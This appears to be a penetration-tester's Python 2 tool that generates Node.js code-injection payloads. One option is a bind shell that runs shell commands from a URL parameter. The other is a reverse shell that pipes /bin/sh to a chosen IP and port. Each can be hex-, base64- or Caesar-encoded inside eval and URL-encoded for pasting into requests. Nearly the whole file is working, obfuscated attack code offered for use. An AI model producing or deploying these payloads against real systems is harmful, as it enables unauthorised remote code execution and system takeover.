#!/usr/bin/env python
#
# Author: Andre Lima @0x4ndr3
# Blog post: https://pentesterslife.blog/
#

import click
import socket  # to validate the IP address
import urllib  # to URL percent-encode the payloads
import base64


def get_default_bind_JS_code(port):
    return '''(function x(){require('http').createServer(function(req,res){res.writeHead(200,\
{"Content-Type":"text/plain"});require('child_process').exec(require('url').parse(req.url\
,true).query['c'],function(e,s,st){res.end(s)})}).listen(%s)})()''' % port
#    (function x(){
#        require('http').createServer(
#            function(req,res){
#                res.writeHead(200,{"Content-Type":"text/plain"}
#            );
#                require('child_process').exec(require('url').parse(req.url,true).query['c'],
#                    function(e,s,st){
#                        res.end(s)
#                    }
#                )
#            }
#        ).listen(%s)
#    })()


def get_default_reverse_JS_code(ip, port):
    return '''(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh"\
,[]);var client=new net.Socket();client.connect(%s,"%s", function(){client.pipe(sh.stdin);sh.stdout.\
pipe(client);sh.stderr.pipe(client)});return /pwned/;})()''' % (port, ip)
#    (function(){
#        var net = require("net"),
#            cp = require("child_process"),
#            sh = cp.spawn("/bin/sh", []);
#        var client = new net.Socket();
#        client.connect(%s, "%s", function(){
#            client.pipe(sh.stdin);
#            sh.stdout.pipe(client);
#            sh.stderr.pipe(client);
#        });
#        return /pwned/; // Prevents the Node.js app from crashing
#    })()


def show_result(encoded_payload):
    print
    print "Original payload:"
    print encoded_payload
    print
    print "Copy and paste the next line (URL encoded already):"
    print urllib.quote_plus(encoded_payload)
    print


class IPParamType(click.ParamType):
    name = 'IP'

    def convert(self, value, param, ctx):
        try:
            socket.inet_aton(value)
            return value
        except socket.error:
            self.fail('%s is not a valid IP address' % value, param, ctx)


IP = IPParamType()


@click.group()
def generator():
    pass


@click.command()
@click.option('-p', '--port', type=click.IntRange(1, 65535), default=4444, help='value between 1 and 65535')
@click.option('-e', '--encoding', type=click.Choice(['hex', 'base64', 'caesar']), default='hex')
@click.option('-k', '--key', type=click.IntRange(1, 255), default=1, help='only read if caesar encoding is chosen')
def bind(port, encoding, key):
    print "TCP Port = %s" % (port)
    print "Encoding = %s" % (encoding)
    if encoding == "caesar":
        print "     Key = %s" % (key)
    encoded_payload = ""
    JS_payload = get_default_bind_JS_code(port)
    if encoding == 'hex':
        encoded_payload = "eval(Buffer.from('" + \
            JS_payload.encode('hex') + "','hex').toString())"
    elif encoding == 'base64':
        encoded_payload = "eval(Buffer.from('" + \
            base64.b64encode(JS_payload) + "','base64').toString())"
    elif encoding == 'caesar':
        for i in JS_payload:
            encoded_payload += "%03d" % (ord(i)+key)
        encoded_payload = "caesarShift=(str,amount)=>{var output='',code='';for(var i=0;i<str.length;i+=3)\
{code = str.substring(i,i+3);c=String.fromCharCode((Number(code)+amount)%255);output+=\
c}return output};eval(caesarShift('" + encoded_payload + "',-" + str(key) + "))"

    show_result(encoded_payload)


@click.command()
@click.option('--ip', type=IP, default='127.0.0.1')
@click.option('-p', '--port', type=click.IntRange(1, 65535), default=4444, help='TCP port in range between 1 and 65535')
@click.option('-e', '--encoding', type=click.Choice(['hex', 'base64', 'caesar']), default='hex')
@click.option('-k', '--key', type=click.IntRange(1, 255), default=1)
def reverse(ip, port, encoding, key):
    print "IP       = %s" % (ip)
    print "TCP Port = %s" % (port)
    print "Encoding = %s" % (encoding)
    if encoding == "caesar":
        print "     Key = %s" % (key)
    encoded_payload = ""
    JS_payload = get_default_reverse_JS_code(ip, port)
    if encoding == 'hex':
        encoded_payload = "eval(new Buffer('" + \
            JS_payload.encode('hex') + "','hex').toString())"
    elif encoding == 'base64':
        encoded_payload = "eval(new Buffer('" + \
            base64.b64encode(JS_payload) + "','base64').toString())"
    elif encoding == 'caesar':
        for i in JS_payload:
            encoded_payload += "%03d" % (ord(i)+key)
        encoded_payload = "caesarShift=(str,amount)=>{var output='',code='';for(var i=0;i<str.length;i+=3)\
{code = str.substring(i,i+3);c=String.fromCharCode((Number(code)+amount)%255);output+=\
c}return output};eval(caesarShift('" + encoded_payload + "',-" + str(key) + "))"

    show_result(encoded_payload)


generator.add_command(bind)
generator.add_command(reverse)

if __name__ == '__main__':
    generator()
